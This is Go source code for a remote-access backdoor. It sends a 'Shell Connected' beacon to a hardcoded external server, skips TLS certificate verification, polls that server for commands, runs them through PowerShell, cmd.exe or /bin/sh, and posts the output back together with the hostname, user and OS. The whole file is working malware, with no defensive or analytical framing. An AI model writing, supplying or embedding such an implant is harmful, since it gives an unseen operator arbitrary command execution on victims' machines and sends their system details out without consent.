package main

import (
	"crypto/tls"
	"encoding/json"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type Command struct {
	ID      string `json:"id"`
	Command string `json:"command"`
	Type    string `json:"type"`
}

type Response struct {
	ID       string `json:"id"`
	Output   string `json:"output"`
	Error    string `json:"error"`
	Hostname string `json:"hostname"`
	User     string `json:"user"`
	OS       string `json:"os"`
}

const (
	SERVER_URL    = "https://weza.datacenter-eg.site"
	POLL_INTERVAL = 3 * time.Second
)

func main() {
	// Get system info
	hostname, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}

	// Create HTTP client
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}

	// Send connection beacon
	beacon := Response{
		ID:       "beacon",
		Output:   "WEEEEZA Shell Connected!",
		Hostname: hostname,
		User:     user,
		OS:       runtime.GOOS,
	}
	sendResponse(client, beacon)

	// Main loop
	for {
		cmd := getCommand(client)
		if cmd.Command != "" {
			output, err := executeCommand(cmd.Command, cmd.Type)

			response := Response{
				ID:       cmd.ID,
				Output:   output,
				Hostname: hostname,
				User:     user,
				OS:       runtime.GOOS,
			}

			if err != nil {
				response.Error = err.Error()
			}

			sendResponse(client, response)
		}

		time.Sleep(POLL_INTERVAL)
	}
}

func getCommand(client *http.Client) Command {
	resp, err := client.Get(SERVER_URL + "/api/get")
	if err != nil {
		return Command{}
	}
	defer resp.Body.Close()

	var cmd Command
	json.NewDecoder(resp.Body).Decode(&cmd)
	return cmd
}

func sendResponse(client *http.Client, response Response) {
	data, _ := json.Marshal(response)
	req, _ := http.NewRequest("POST", SERVER_URL+"/api/response", strings.NewReader(string(data)))
	req.Header.Set("Content-Type", "application/json")
	client.Do(req)
}

func executeCommand(command string, cmdType string) (string, error) {
	var cmd *exec.Cmd

	switch cmdType {
	case "powershell":
		cmd = exec.Command("powershell.exe", "-Command", command)
	case "cmd":
		cmd = exec.Command("cmd.exe", "/C", command)
	default:
		// Auto-detect
		if runtime.GOOS == "windows" {
			if strings.Contains(strings.ToLower(command), "get-") ||
				strings.Contains(strings.ToLower(command), "invoke-") ||
				strings.Contains(command, "$") {
				cmd = exec.Command("powershell.exe", "-Command", command)
			} else {
				cmd = exec.Command("cmd.exe", "/C", command)
			}
		} else {
			cmd = exec.Command("/bin/sh", "-c", command)
		}
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}
